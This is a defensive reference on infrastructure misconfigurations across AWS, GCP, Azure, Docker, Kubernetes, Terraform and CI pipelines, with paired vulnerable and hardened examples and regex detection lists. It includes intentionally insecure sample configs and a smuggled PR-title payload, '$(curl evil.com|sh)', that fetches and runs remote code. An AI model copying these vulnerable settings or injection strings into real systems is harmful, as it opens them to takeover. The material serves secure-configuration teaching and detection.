# Infrastructure Vulnerability Patterns

Cloud (AWS/GCP/Azure), containers, Kubernetes, Terraform, GitHub Actions, GitLab CI. Misconfiguration is the #1 cloud-breach cause.

Sources: CIS Benchmarks, NSA/CISA Kubernetes Hardening Guide v1.2, GitHub Actions security hardening.

---

## AWS

### S3
```hcl
# VULN
resource "aws_s3_bucket" "data" { bucket = "co-data" }
resource "aws_s3_bucket_acl" "data" {
  bucket = aws_s3_bucket.data.id
  acl    = "public-read"
}

# FIX
resource "aws_s3_bucket_public_access_block" "data" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  bucket = aws_s3_bucket.data.id
  rule { apply_server_side_encryption_by_default { sse_algorithm = "aws:kms" } }
}
resource "aws_s3_bucket_versioning" "data" {
  bucket = aws_s3_bucket.data.id
  versioning_configuration { status = "Enabled" }
}
```

### IAM
```json
// VULN — full admin to a service
{ "Effect": "Allow", "Action": "*", "Resource": "*" }

// FIX — least privilege
{
  "Effect": "Allow",
  "Action": ["s3:GetObject", "s3:PutObject"],
  "Resource": "arn:aws:s3:::my-bucket/*",
  "Condition": { "StringEquals": { "aws:PrincipalTag/Team": "Backend" } }
}
```

**Detection regex**: `"Action"\s*:\s*"\*".*"Resource"\s*:\s*"\*"` on the same statement.

Other IAM red flags:
- `iam:PassRole` with `Resource: "*"` — privilege escalation.
- Wildcard trust relationships in role assume-role policies.
- Long-lived access keys instead of IAM Roles / OIDC federation.
- `s3:*`, `ec2:*`, `dynamodb:*` instead of specific actions.

### RDS
```hcl
# VULN
resource "aws_db_instance" "main" {
  publicly_accessible = true
  storage_encrypted   = false
}

# FIX
resource "aws_db_instance" "main" {
  publicly_accessible = false
  storage_encrypted   = true
  kms_key_id          = aws_kms_key.rds.arn
  iam_database_authentication_enabled = true
  deletion_protection = true
  backup_retention_period = 14
}
```

### Security Groups
```hcl
# VULN
resource "aws_security_group_rule" "ssh" {
  type        = "ingress"
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}

# FIX — bastion via SSM Session Manager (no inbound SSH at all)
# Or restrict to corporate VPN CIDR.
```

### EC2 IMDS
```hcl
# VULN — IMDSv1 (vulnerable to SSRF → cred theft, classic Capital One 2019)
resource "aws_instance" "app" {
  metadata_options { http_tokens = "optional" }
}

# FIX — IMDSv2 required
resource "aws_instance" "app" {
  metadata_options {
    http_tokens                 = "required"
    http_put_response_hop_limit = 1
    http_endpoint               = "enabled"
  }
}
```

### Lambda / Secrets
```ts
// VULN — secret in env var, in CloudFormation/Terraform plain text
environment: { variables: { DB_PASSWORD: 'plaintext' } }

// FIX — Secrets Manager / SSM SecureString reference; KMS-encrypted env
environment: { variables: { DB_SECRET_ARN: secret.secretArn } }
// fetch in Lambda using AWS SDK with provided IAM role
```

### CloudTrail / Logging
- Multi-region trail with management + data events.
- S3 server access logging on every public-facing bucket.
- VPC Flow Logs.
- GuardDuty enabled.

---

## GCP

- Public buckets: `allUsers` / `allAuthenticatedUsers` in IAM bindings.
- Default compute SA on VM (`PROJECT_NUMBER-compute@developer.gserviceaccount.com`) with broad scopes — replace with explicit minimal-permission SA.
- `roles/owner` or `roles/editor` to humans/SAs — too broad.
- Firewall rules with source `0.0.0.0/0` on non-public ports.
- VPC Service Controls disabled.
- No CMEK on BigQuery / Cloud Storage / Cloud SQL.

---

## Azure

- Storage account `allowBlobPublicAccess: true`.
- NSG rule with `sourceAddressPrefix: "*"` or `"0.0.0.0/0"` on RDP/SSH.
- Key Vault access policies with `keys: ["all"]` — prefer RBAC + least-priv.
- Managed identity over connection strings (always).
- Azure Defender for Cloud disabled.

---

## Docker

### Dockerfile Smells
```dockerfile
# VULN
FROM node:latest                         # non-deterministic
USER root                                # often default
RUN curl https://get.example.com | sh    # supply-chain risk
ENV API_KEY=sk-live-...                  # secret in image layer
ADD https://example.com/file.tar /opt/   # unverified
```

### Hardened Dockerfile
```dockerfile
FROM node:20.18.1-alpine@sha256:abc123...    # pin digest
RUN addgroup -S app && adduser -S app -G app
WORKDIR /app
COPY --chown=app:app package*.json ./
RUN npm ci --omit=dev && npm cache clean --force
COPY --chown=app:app . .
USER app
EXPOSE 3000
HEALTHCHECK --interval=30s CMD node healthcheck.js
CMD ["node", "server.js"]
```

Detection regex (smells):
```
^USER\s+root\s*$
^FROM\s+\S+:latest
^RUN\s+.*curl\s+[^|]+\|\s*(sudo\s+)?(bash|sh)
^ADD\s+http
^ENV\s+\w*(KEY|TOKEN|SECRET|PASSWORD)\s*=
```

---

## Kubernetes

### Bad Manifests
```yaml
spec:
  hostNetwork: true             # red flag
  hostPID: true                 # red flag
  hostIPC: true                 # red flag
  containers:
  - name: app
    image: app:latest           # non-deterministic
    securityContext:
      privileged: true          # RCE → host escape
      allowPrivilegeEscalation: true
      runAsUser: 0              # root in container
      capabilities: { add: ["SYS_ADMIN", "NET_ADMIN"] }
    volumeMounts:
    - { name: dockersock, mountPath: /var/run/docker.sock }   # container escape
  volumes:
  - { name: dockersock, hostPath: { path: /var/run/docker.sock } }
```

### Hardened Pod
```yaml
spec:
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    seccompProfile: { type: RuntimeDefault }
  containers:
  - name: app
    image: app@sha256:abc123...                   # digest pin
    imagePullPolicy: IfNotPresent
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities: { drop: ["ALL"] }
    resources:
      requests: { cpu: 100m, memory: 128Mi }
      limits:   { cpu: 500m, memory: 512Mi }
    livenessProbe:
      httpGet: { path: /healthz, port: 3000 }
    readinessProbe:
      httpGet: { path: /ready, port: 3000 }
```

### NetworkPolicy
Default-deny per namespace, then explicit allows:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: default-deny, namespace: app }
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
```

### Secrets
- Never `env: [{ name: API_KEY, value: 'sk-...' }]` — use `secretRef` and back with External Secrets Operator / Vault / CSI driver.
- Don't bake secrets into images; mount at runtime.
- Use Pod Security Admission with `restricted` profile per namespace.

### Image Signing
- Cosign-sign images at build.
- Admission policy (Kyverno / OPA Gatekeeper) requires signature + attestation before scheduling.
- Trivy operator scans running pods continuously.

### RBAC
- Never bind `cluster-admin` to `system:authenticated`.
- Use `Role`/`RoleBinding` (namespace-scoped) over `ClusterRole` where possible.
- Service accounts get minimum verbs/resources.

---

## CI/CD — GitHub Actions

### `pull_request_target` Disaster
```yaml
# VULN — runs with org secrets, checks out fork code, executes it
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # untrusted code
      - run: npm install && npm test                       # runs attacker code with secrets
```
**Fix**: use `pull_request` (no secrets, ephemeral token); or split — `pull_request_target` to label/approve, separate `workflow_run` to test labelled PRs in isolated runner without org secrets.

### Script Injection via PR Title / Body / Comment
```yaml
# VULN — title `$(curl evil.com|sh)#`
- run: echo "${{ github.event.pull_request.title }}"

# FIX
- env: { TITLE: ${{ github.event.pull_request.title }} }
  run: echo "$TITLE"
```

Same for: `${{ github.event.pull_request.body }}`, `${{ github.event.comment.body }}`, `${{ github.event.issue.title/body }}`, `${{ github.head_ref }}`, `${{ github.event.workflow_run.head_branch }}`.

### Action Pinning
```yaml
# VULN — tag mutation supply-chain attack (tj-actions/changed-files Mar 2025, CVE-2025-30066 stole secrets via mutated tag)
- uses: tj-actions/changed-files@v44

# FIX — pin to full SHA
- uses: tj-actions/changed-files@40f36c92fcd3d7d3a04c64c4f2c8f9d1...
```

### Default Permissions
```yaml
# At workflow root
permissions: read-all
# Then per-job, grant only what's needed
jobs:
  build:
    permissions:
      contents: read
      pull-requests: write
```
Repo setting: default `GITHUB_TOKEN` to read-only.

### Fork Secrets
Org settings:
- "Require approval for first-time contributors"
- "Fork pull request workflows from outside collaborators require approval"
- Restrict secrets to environments with reviewers (deployment environments).

### Self-Hosted Runners
- Never on public repos without ephemeral, isolated, single-job runners (actions-runner-controller in k8s mode, or AWS CodeBuild).
- Persistent runners → cross-build poisoning.

### OIDC for Cloud
Use GitHub Actions OIDC + cloud trust relationship instead of long-lived access keys. Pin trust policy to specific repo + branch.

---

## CI/CD — GitLab

- `CI_JOB_TOKEN` permissions — restrict via "Limit access to this project" + Project Access Tokens.
- Protected branches + protected variables.
- Use `rules:` instead of `only:` to ensure jobs don't run on untrusted MR sources.
- Pin Docker images by digest in `image:` directives.
- Don't trust `$CI_COMMIT_TITLE`, `$CI_MERGE_REQUEST_TITLE`, etc. as shell args.

---

## Terraform / IaC General

- Run Checkov, tfsec, terrascan, cfn-nag in CI on every PR.
- State backend encrypted + locked (S3 + DynamoDB, GCS, Terraform Cloud).
- No secrets in `.tfvars` committed.
- Use modules from a vetted internal registry; pin module versions.
- `prevent_destroy = true` on critical resources.

---

## Detection Cheat-Sheet (Infra)

```
# Cloud
0\.0\.0\.0/0
"Action"\s*:\s*"\*"
publicly_accessible\s*=\s*true
acl\s*=\s*"public-read"
http_tokens\s*=\s*"optional"      # IMDSv1 enabled

# K8s
\bprivileged:\s*true\b
\brunAsUser:\s*0\b
\bhostNetwork:\s*true\b
\bhostPID:\s*true\b
\ballowPrivilegeEscalation:\s*true\b
/var/run/docker\.sock

# Docker
^USER\s+root\s*$
^FROM\s+\S+:latest
^RUN\s+.*curl\s+[^|]+\|\s*(sudo\s+)?(bash|sh)
^ENV\s+\w*(KEY|TOKEN|SECRET|PASSWORD)\s*=

# CI
^on:\s*pull_request_target
permissions:\s*write-all
\$\{\{\s*github\.event\.(pull_request\.(title|body|head_ref)|comment\.body|issue\.(title|body))\s*\}\}
uses:\s*[\w\-]+/[\w\-]+@v\d+\s*$    # mutable tag (should be SHA-pinned)
```
